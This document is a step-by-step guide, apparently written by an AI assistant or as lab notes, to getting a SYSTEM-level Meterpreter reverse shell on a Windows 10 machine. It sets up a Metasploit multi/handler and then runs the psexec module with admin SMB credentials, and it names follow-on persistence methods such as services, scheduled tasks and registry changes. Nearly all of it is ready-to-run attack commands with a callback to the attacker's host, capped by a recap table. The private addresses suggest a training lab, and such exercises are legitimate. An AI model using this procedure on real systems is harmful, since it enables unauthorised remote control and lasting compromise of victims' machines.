**simple, step-by-step guide** to get a **Meterpreter shell on a Windows 10 machine using PsExec**, which is what you need before setting up persistence. I've made it **easy to remember and repeat**, broken into two phases: **Listener Setup (Kali)** and **PsExec Exploit (Metasploit)**.

---

## 🧪 Phase 1: Set Up the Listener in Kali Linux

> Think of this as “setting the trap” to catch the shell.

### 🧱 Step 1: Open Metasploit
```bash
msfconsole
```

### 🧱 Step 2: Kill old background jobs (optional but safe)
```bash
jobs -K
```

### 🧱 Step 3: Set up a multi/handler to catch the reverse shell
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.22.117.100     # Your Kali IP address
set LPORT 4444
run -j
```
> ✅ You now have a listener running in the background, ready to catch a reverse shell.

---

## 💣 Phase 2: Launch the Exploit with PsExec

> Think of this as “delivering the shell.”

### 🧱 Step 4: Use PsExec in Metasploit
```bash
use exploit/windows/smb/psexec
```

### 🧱 Step 5: Set the target IP
```bash
set RHOSTS 172.22.117.20     # Target Windows 10 IP
```

### 🧱 Step 6: Set SMB credentials (must be ADMIN)
```bash
set SMBUser tstark
set SMBPass Password!
set SMBDomain megacorpone
```

### 🧱 Step 7: Use the same payload from the handler
```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.22.117.100
set LPORT 4444
```

### 🧱 Step 8: Launch the attack
```bash
run
```

---

## ✅ What to Expect

If successful, you'll see:
```
Sending stage (200262 bytes) to 172.22.117.20
Meterpreter session 1 opened
```

You now have a **SYSTEM-level Meterpreter session**, which is required for persistence techniques like:

- Creating services
- Scheduled tasks
- Registry changes

---

## 🔁 Quick Recap

| Step | Command |
|------|---------|
| 1 | `msfconsole` |
| 2 | `jobs -K` |
| 3 | `use exploit/multi/handler` |
| 4 | `set PAYLOAD windows/x64/meterpreter/reverse_tcp` |
| 5 | `set LHOST <Kali IP>` |
| 6 | `set LPORT 4444` |
| 7 | `run -j` |
| 8 | `use exploit/windows/smb/psexec` |
| 9 | `set RHOSTS <Target IP>` |
| 10 | `set SMBUser`, `SMBPass`, `SMBDomain` |
| 11 | `set PAYLOAD`, `LHOST`, `LPORT` again |
| 12 | `run` |

---
